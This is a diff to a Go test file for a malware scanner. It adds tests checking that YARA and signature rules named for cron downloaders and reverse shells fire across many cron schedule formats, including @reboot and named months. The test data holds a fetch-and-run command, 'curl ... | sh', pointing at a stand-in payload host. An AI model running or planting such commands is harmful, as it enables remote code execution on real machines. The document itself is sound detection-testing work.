@@ -11,7 +11,8 @@ import (
 	csmyara "github.com/pidginhost/csm/internal/yara"
 )
 
-func TestCronDownloaderCommandBoundaries(t *testing.T) {
+func cronRuleScanners(t *testing.T) (*csmyara.Scanner, *signatures.Scanner) {
+	t.Helper()
 	_, thisFile, _, ok := runtime.Caller(0)
 	if !ok {
 		t.Fatal("runtime.Caller failed")
@@ -25,6 +26,25 @@ func TestCronDownloaderCommandBoundaries(t *testing.T) {
 	if err := yamlScanner.LoadError(); err != nil {
 		t.Fatalf("loading YAML rules: %v", err)
 	}
+	return yaraScanner, yamlScanner
+}
+
+func assertCronRules(t *testing.T, yaraScanner *csmyara.Scanner, yamlScanner *signatures.Scanner, content []byte, want bool) {
+	t.Helper()
+	matches, err := yaraScanner.ScanBytesChecked(content)
+	if err != nil {
+		t.Fatalf("YARA scan failed: %v", err)
+	}
+	if got := hasRepositoryYaraRule(matches, "backdoor_cron_downloader"); got != want {
+		t.Errorf("YARA matched = %t, want %t", got, want)
+	}
+	if got := hasSignatureRule(yamlScanner.ScanContent(content, ".cron"), "backdoor_cron_reverse_shell"); got != want {
+		t.Errorf("YAML matched = %t, want %t", got, want)
+	}
+}
+
+func TestCronDownloaderCommandBoundaries(t *testing.T) {
+	yaraScanner, yamlScanner := cronRuleScanners(t)
 
 	tests := []struct {
 		name    string
@@ -65,17 +85,49 @@ func TestCronDownloaderCommandBoundaries(t *testing.T) {
 	}
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
-			content := []byte("*/5 * * * * " + tc.command)
-			matches, err := yaraScanner.ScanBytesChecked(content)
-			if err != nil {
-				t.Fatalf("YARA scan failed: %v", err)
-			}
-			if got := hasRepositoryYaraRule(matches, "backdoor_cron_downloader"); got != tc.want {
-				t.Errorf("YARA matched = %t, want %t", got, tc.want)
-			}
-			if got := hasSignatureRule(yamlScanner.ScanContent(content, ".cron"), "backdoor_cron_reverse_shell"); got != tc.want {
-				t.Errorf("YAML matched = %t, want %t", got, tc.want)
-			}
+			assertCronRules(t, yaraScanner, yamlScanner, []byte("*/5 * * * * "+tc.command), tc.want)
+		})
+	}
+}
+
+// The rule used to require an every-N-minutes schedule, so a downloader
+// planted to run every minute, hourly, daily or at boot went unreported.
+func TestCronDownloaderSchedules(t *testing.T) {
+	yaraScanner, yamlScanner := cronRuleScanners(t)
+	const command = " curl -fsSL https://payload.example.test/a | sh"
+	tests := []struct {
+		schedule string
+		want     bool
+	}{
+		{"*/5 * * * *", true},
+		{"* * * * *", true},
+		{"0 * * * *", true},
+		{"30 3 * * *", true},
+		{"0,15,30,45 * * * *", true},
+		{"0 9-17 * * 1-5", true},
+		{"*/10 */2 1-15/2 * *", true},
+		{"0 0 1 1 *", true},
+		{"0 0 * jan-dec mon,wed,fri", true},
+		{"0 0 * JAN SUN", true},
+		{"*\t*\t*\t*\t*", true},
+		{"17 * * * * root", true},
+		{"@reboot", true},
+		{"@hourly", true},
+		{"@daily", true},
+		{"@midnight", true},
+		{"@weekly", true},
+		{"@monthly", true},
+		{"@yearly", true},
+		{"@annually", true},
+		{"@REBOOT", true},
+		{"* * * *", false},
+		{"* * *\n* *", false},
+		{"the cat sat on the", false},
+		{"0 0 * june mon", false},
+	}
+	for _, tc := range tests {
+		t.Run(tc.schedule, func(t *testing.T) {
+			assertCronRules(t, yaraScanner, yamlScanner, []byte(tc.schedule+command+"\n"), tc.want)
 		})
 	}
 }
